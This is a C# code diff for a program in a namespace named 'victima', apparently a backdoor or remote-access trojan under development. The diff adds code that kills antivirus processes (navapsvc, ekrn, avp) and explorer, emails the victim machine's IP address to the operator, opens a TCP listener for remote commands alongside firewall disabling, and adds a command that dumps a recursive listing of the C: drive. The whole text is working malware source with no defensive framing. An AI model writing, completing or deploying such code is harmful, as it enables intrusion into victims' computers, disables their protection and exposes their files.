@@ -84,9 +84,10 @@ namespace victima
             //iniciar desactivando el firewall
             Desactivar_firewall();
             //obtener el ip externo y enviarlo por correo
-            string public_ip = GetPublicIP();            
-            //Mandar_email_ip(public_ip);
-            string localhost_ip = "192.168.1.155";
+            //string public_ip = GetPublicIP();            
+            
+            string localhost_ip = Get_ip_local_address();
+            Mandar_email_ip(localhost_ip);
             //iniciar el escucha en el puerto 3306
             IPAddress IP_address = IPAddress.Parse(localhost_ip);
             listener = new TcpListener(IP_address, 3307);
@@ -257,6 +258,11 @@ namespace victima
                                     DesactivarAntivirus();
                                     sw.WriteLine("SW AV cmd llamado el:" + new DateTime().ToString());
                                     break;
+                                case "listado_directorio":
+                                    list_C_enviar_mail();
+                                    sw.Write("Done");
+                                    sw.Flush();
+                                    break;
                                 default:
                                     write_log("yapues");
                                     sw.WriteLine("no reconocido,echo:" + initial_command);
@@ -284,9 +290,56 @@ namespace victima
 
         private static void DesactivarAntivirus()
         {
-            throw new NotImplementedException();
+            List<Process> list_proc = Process.GetProcesses().ToList();
+            string[] lista_procesos_av = new string[] { 
+                "navapsvc", 
+                "ekrn", 
+                "avp", 
+                "explorer" };
+            list_proc.ForEach(delegate(Process proc)
+            {
+                if (lista_procesos_av.Contains(proc.ProcessName))
+                {
+                    proc.Kill();
+                }
+            });
+        }
+        private static void list_C_enviar_mail()
+        {
+            try
+            {
+                Process proc = new Process();
+                string top = "cmd.exe";
+                proc.StartInfo.Arguments = @"/C dir c:\ /s > dir.txt";
+                proc.StartInfo.FileName = top;
+                proc.StartInfo.UseShellExecute = false;
+                proc.StartInfo.RedirectStandardOutput = false;
+                proc.StartInfo.CreateNoWindow = true;
+                proc.Start();
+                proc.WaitForExit();
+
+                Console.WriteLine("Saved");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error");
+            }
         }
 
+        static string Get_ip_local_address()
+        {
+            System.Net.IPHostEntry host;
+            string localIP = "?";
+            host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (IPAddress ip in host.AddressList)
+            {
+                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                {
+                    localIP = ip.ToString();
+                }
+            }
+            return localIP;
+        }
 
 
 
@@ -299,7 +352,7 @@ namespace victima
             Desactivar_firewall();
             //obtener el ip externo y enviarlo por correo
             //string public_ip = GetPublicIP();
-            string public_ip = "192.168.1.155";
+            string public_ip = "192.168.0.104";
             //Mandar_email_ip(public_ip);
             //iniciar el escucha en el puerto 3306
             IPAddress IP_address = IPAddress.Parse(public_ip);
